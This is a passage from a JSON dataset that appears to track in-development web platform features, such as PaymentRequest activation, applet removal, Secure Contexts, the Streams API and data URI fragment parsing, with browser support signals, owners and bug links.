    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1445138",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "gogerald@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Payments"
        ],
        "flag": false,
        "bug": "https://crbug.com/825270",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=179056",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Allowing PaymentRequest.show() to be triggered without user activation could be abused by malicious websites. To protect users, the spec has been changed to require user activation.",
    "id": 5948593429020672,
    "resources": {}
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:28:44.913210",
      "by": "ericbidelman@google.com"
    },
    "name": "Remove MediaRecorder |ignoreMutedMedia|",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://github.com/w3c/mediacapture-record/issues/99",
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "mcasas@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>MediaStream>Recording"
        ],
        "flag": false,
        "bug": "https://crbug.com/678854",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "After discussion in the W3C Spec Github [1], there is agreement to remove this feature (and its associated boolean attribute).  FF never shipped it [2], Chromium never wired its behaviour [3].\r\n\r\n[1] https://github.com/w3c/mediacapture-record/issues/99\r\n[2] https://github.com/mozilla/gecko-dev/blob/master/dom/webidl/MediaRecorder.webidl\r\n[3] https://cs.chromium.org/search/?q=m_ignoreMutedMedia&sq=package:chromium&type=cs",
    "id": 5637418589880320,
    "resources": {
      "docs": [
        "https://w3c.github.io/mediacapture-record/MediaRecorder.html"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:29:12.468480",
      "by": "ericbidelman@google.com"
    },
    "name": "Remove support for <applet>",
    "comments": "Removing support for <applet> will actually improve the state of <applet> in Blink. Currently, we display a placeholder that \"This plugin is not supported\" instead of displaying the fallback content: since Blink doesn't support NPAPI/Java, we should really be displaying the fallback content instead of something unactionable.",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://html.spec.whatwg.org/#the-applet-element",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "dcheng@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://crbug.com/470301",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The <applet> tag is only used to instantiate the Java plugin. Running the Java plugin requires NPAPI support, but NPAPI support in Blink has already been removed.\r\n\r\nWe should just remove any special handling for <applet> and let it be handled like any other unspecified tag: in the HTML spec, it is listed under obsolete features, with the header text \"Elements in the following list are entirely obsolete, and must not be used by authors\".",
    "id": 6246781461463040,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/applet"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2018-01-12 07:25:18.999190",
      "by": "rakina@google.com"
    },
    "name": "Retargeting result of elementFromPoint and elementsFromPoint",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/webcomponents/spec/shadow/#extensions-to-the-documentorshadowroot-mixin",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "rakina@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>DOM>ShadowDOM"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=759947",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Previously elementFromPoint and elementsFromPoint are not per spec, and it may return null incorrectly because it is not retargeting the result correctly. We are fixing it to adhere to the spec by applying the correct retargeting algorithm.",
    "id": 6317470654660608,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2018-02-06 19:08:58.640970",
      "by": "dcheng@chromium.org"
    },
    "name": "Return null from contentDocument and getSVGDocument() on cross-origin access",
    "comments": "Note that Edge and Safari both match current Chrome behavior. Firefox is the only browser that returns null on cross-origin access.\r\n\r\nIt is possible that there are documents that catch the thrown exception and using it to do something different when thrown (e.g. using postMessage to communicate with the cross-origin context instead). However, given that Firefox behavior has differed for several years, I suspect that is not likely to be an issue.",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://html.spec.whatwg.org/multipage/iframe-embed-object.html#dom-iframe-contentdocument",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=829872",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "dcheng@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>HTML"
        ],
        "flag": false,
        "bug": "https://crbug.com/582245",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Change the contentDocument attribute and the getSVGDocument() method of HTMLEmbedElement, HTMLIframeElement, and HTMLObjectElement to return null on cross-origin access, rather than throwing an exception.",
    "id": 5776623743795200,
    "resources": {
      "docs": [
        "https://html.spec.whatwg.org/multipage/iframe-embed-object.html#dom-iframe-contentdocument",
        "https://html.spec.whatwg.org/multipage/embedded-content-other.html#dom-media-getsvgdocument",
        "https://html.spec.whatwg.org/multipage/browsers.html#concept-bcc-content-document"
      ]
    }
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2017-09-20 18:21:42.555940",
      "by": "Patket@microsoft.com"
    },
    "name": "SVG2",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://svgwg.org/svg2-draft/single-page.html",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "pdr@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "http://crbug.com/225863",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://dev.modern.ie/platform/status/svg2",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Implement the new SVG2 features.",
    "id": 5760616295825408,
    "resources": {}
  },
  {
    "category": "Houdini",
    "updated": {
      "when": "2018-03-28 20:45:36.312280",
      "by": "ericbidelman@google.com"
    },
    "name": "Scroll Customization (Houdini)",
    "tags": [
      "events",
      "scroll",
      "touch"
    ],
    "comments": "From houdini IRC log:\r\n| dean: experiment/implement and report back\r\n| rbyers: prototypes landing soon\r\n| ...\r\n| RESOLVED: rbyers TabAtkins mattrakow to work on CSS Scroll Extensions\r\n",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://dev.w3.org/houdini/css-scroll/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "http://www.w3.org/2015/02/07-houdini-irc",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "tdresser@chromium.org",
          "rbyers@chromium.org",
          "input-dev@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Scroll"
        ],
        "flag": false,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=416862",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "http://www.w3.org/2015/02/07-houdini-irc",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "safari": {
        "view": {
          "url": "http://www.w3.org/2015/02/07-houdini-irc",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Add applyScroll and distributeScroll methods to Element, enabling customization of how scroll deltas are applied and distributed. This will enable extending or replacing native scrolling behaviors.",
    "id": 5616710262456320,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1VnvAqeWFG9JFZfgG5evBqrLGDZYRE5w6G5jEDORekPY/edit#"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-05-22 14:54:30.066430",
      "by": "jmedley@google.com"
    },
    "name": "Scroll to CSS selector",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "bmcquade@chromium.org",
          "pnoland@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Scroll"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=841843",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "To enable users to easily navigate to specific content in a web page, a CSS selector may be used to indicate part of the document.\r\n\r\nIndicated part of the document: https://html.spec.whatwg.org/multipage/browsing-the-web.html#the-indicated-part-of-the-document\r\n\r\n",
    "id": 4771915918999552,
    "resources": {
      "docs": [
        "https://github.com/bryanmcquade/scroll-to-css-selector"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:29:09.471240",
      "by": "ericbidelman@google.com"
    },
    "name": "Secure Contexts",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/webappsec/specs/powerfulfeatures/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://crbug.com/534788",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Mixed signals",
          "val": 3
        }
      }
    },
    "summary": "This specification provides guidelines for user agent implementors and spec authors for implementing features whose properties dictate that they be exposed to the web only within a trustworthy environment.",
    "id": 6021277022158848,
    "resources": {}
  },
  {
    "category": "Security",
    "updated": {
      "when": "2018-03-28 15:48:19.968400",
      "by": "jmedley@google.com"
    },
    "name": "Signature-based Resource Loading Restrictions",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://github.com/w3c/webappsec-subresource-integrity/blob/master/signature-based-restrictions-explainer.markdown",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://lists.w3.org/Archives/Public/public-webappsec/2017Jun/0001.html",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "vogelheim@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>SecurityFeature"
        ],
        "flag": false,
        "bug": "https://crbug.com/753349",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Subresource integrity is extended with digital signatures. This allows web developers to trust the provenance of a resource, rather than a specific version of a resource.",
    "id": 5713333428682752,
    "resources": {}
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2017-10-27 19:43:12.349820",
      "by": "junov@google.com"
    },
    "name": "Single buffered canvases",
    "tags": [
      "latency",
      "canvas",
      "single buffering"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "junov@google.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Canvas"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=646022",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "This feature provides a low latency rendering mode for canvases. This is useful, for example, for stylus input. Single buffered mode is enabled with canvas.getContext('2d', {singleBuffered: true});\r\n\r\nCaveats: Opting in to this mode breaks synchronization between canvas commands and DOM edits. \r\n\r\nMotivation: NaCl/PPAPI provides native OpenGL rendering surfaces which are currently used to implement low latency interfaces. The deprecation of NaCl creates a need for this API.",
    "id": 5648950090530816,
    "resources": {
      "docs": [
        "https://github.com/whatwg/html/issues/2659"
      ]
    }
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2018-04-25 01:11:42.655730",
      "by": "jmedley@google.com"
    },
    "name": "Stop Loading in Background on Android",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "panicker@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Scheduling"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=775761",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "On Android, task loading in blink scheduler and resource fetching will be stopped (100% throttled) when a renderer has run in the background for more than five minutes. This will lower consumption of non-trivial CPU time and network bandwidth, improve the responsiveness of the foreground app, and conserve batter.\r\n\r\n\r\n",
    "id": 6238781036298240,
    "resources": {}
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2018-04-09 17:46:14.052490",
      "by": "jmedley@google.com"
    },
    "name": "Stop more task queues in background on Android",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "panicker@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Scheduling"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=822954",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "More task queues (in addition to timers and loading) in blink scheduler will be frozen when a renderer has been in the background after a grace time of 5 minutes on Android.\r\n\r\nMany sites continue activity, even after their app has been in background for over 5 minutes. This consumes non-trivial amount of CPU and network bandwidth, and hurts the responsiveness of the foreground app, especially on mobile.\r\n\r\nThis intervention is the next step on the path towards stopping background work on mobile.",
    "id": 4639097628917760,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/10D2uvOVxBZ2YhcwtK1XOb6CClminPpqAeS82KOVT7hk/edit#",
        "https://github.com/WICG/web-lifecycle/blob/master/README.md"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-27 19:12:12.525730"
    },
    "name": "Stop showing ads on websites that are not compliant with the Better Ads Standards.",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "csharrison@chromium.org",
          "ojan@chromium.org",
          "shivanisha@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=737201",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Stop showing ads (including those owned or served by Google) on websites that are not compliant with the Better Ads Standards(https://www.betterads.org/standards/).\r\n\r\nIntroduction to this feature:\r\nhttps://blog.chromium.org/2017/06/improving-advertising-on-web.html\r\n",
    "id": 5738264052891648,
    "resources": {
      "docs": [
        "https://blog.chromium.org/2017/06/improving-advertising-on-web.html"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-07-25 04:44:08.127470",
      "by": "tyoshino@chromium.org"
    },
    "name": "Streams API",
    "tags": [
      "ReadableStream",
      "WritableStream",
      "TransformStream"
    ],
    "comments": "We're shipping the Streams API features step-by-step. See the related entries with the \"Streams API\" prefix and the \"Fetch API\" prefix for information about each sub feature.\r\n\r\nNote that the Streams API implemented in IE is different from the WHATWG one. Edge is implementing the WHATWG one.",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://streams.spec.whatwg.org/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=891286",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "tyoshino@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Network>StreamsAPI"
        ],
        "flag": false,
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "http://status.modern.ie",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "APIs for creating, composing, and consuming streams of data, that map efficiently to low-level I/O primitives, and allow easy composition with built-in backpressure and queuing.\r\n",
    "id": 6605041225957376,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-09-17 09:12:00.796130",
      "by": "Patket@microsoft.com"
    },
    "name": "String 2nd arg of document.createElement should be deprecated",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://dom.spec.whatwg.org/#dom-document-createelement",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "dominicc@chromium.org",
          "a.obzhirov@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=637353",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "According to https://dom.spec.whatwg.org/#dom-document-createelement the second argument should be a dictionary. The string second argument should be deprecated if the usage of the string argument is minimal.",
    "id": 5715857510498304,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-02-12 06:16:19.877440",
      "by": "shanmuga.m@samsung.com"
    },
    "name": "StyleSheet |media|, CSSPageRule |style| IDL attribute should have [PutForwards]",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://drafts.csswg.org/cssom/#the-stylesheet-interface, https://drafts.csswg.org/cssom/#the-csspagerule-interface",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "bhagirathi.s@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>CSS"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=811173",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "StyleSheet |media| should have [PutForwards=mediaText] and CSSPageRule\r\n|style| should have [PutForwards=cssText] to match the specification.\r\n",
    "id": 5216652148867072,
    "resources": {}
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-06-06 15:44:02.456729",
      "by": "gsathya@chromium.org"
    },
    "name": "Symbol.description",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://tc39.github.io/proposal-Symbol-description/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "gsathya@chromium.org",
          "joyee@igalia.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>JavaScript>Language"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=7807",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Expose the [[Description]] internal slot of a symbol directly instead of just indirectly through  Symbol.prototype.toString.\r\n",
    "id": 5340787290144768,
    "resources": {}
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-11-09 11:54:48.938690",
      "by": "peria@google.com"
    },
    "name": "The 'SecureContext' WebIDL attribute.",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://heycam.github.io/webidl/#SecureContext",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1177957",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "peria@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=534788",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://github.com/heycam/webidl/pull/65",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The 'SecureContext' WebIDL attribute controls the exposure of a given interface, method, attribute, etc. If present, it ensures that the given item will be exposed only in a \"Secure Context\", as defined by https://w3c.github.io/webappsec-secure-contexts/",
    "id": 5655692241272832,
    "resources": {}
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2018-03-28 14:14:27.145840",
      "by": "jmedley@google.com"
    },
    "name": "Treat '#' as ending data URI body content",
    "tags": [
      "data",
      "url",
      "pound",
      "fragment"
    ],
    "comments": "This can be seen by visiting the following URL:\r\n\r\ndata:text/html,<div style=\"height:2000px\"></div><a id=\"foo\">bar</a>#foo\r\n\r\nIn a spec-compliant browser, this will render the text 'bar' at the bottom of the page, and scroll to it. In Chrome this URL will both render the text 'bar#foo' and still scroll to it!\r\n\r\nViolating the spec has caused web-compat problems; a common pattern is web-developers writing inline SVG data in a CSS url(), such as the following:\r\n\r\ncontent: url('data:image/svg+xml;utf8,<svg",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://url.spec.whatwg.org/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://wpt.fyi/url/data-uri-fragment.html",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "smcgruer@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Loader"
        ],
        "flag": false,
        "bug": "http://crbug.com/123004",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "By spec, '#' characters in data URIs should not be treated as part of the URI body, and should instead only mark the start of the URI fragment component. Historically Chrome has not adhered to the spec, instead treating '#' characters as both fragment-starters and part of the body. ",
    "id": 5656049583390720,
    "resources": {
      "samples": [
        "data:text/html,body#shouldnt_render_in_body"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
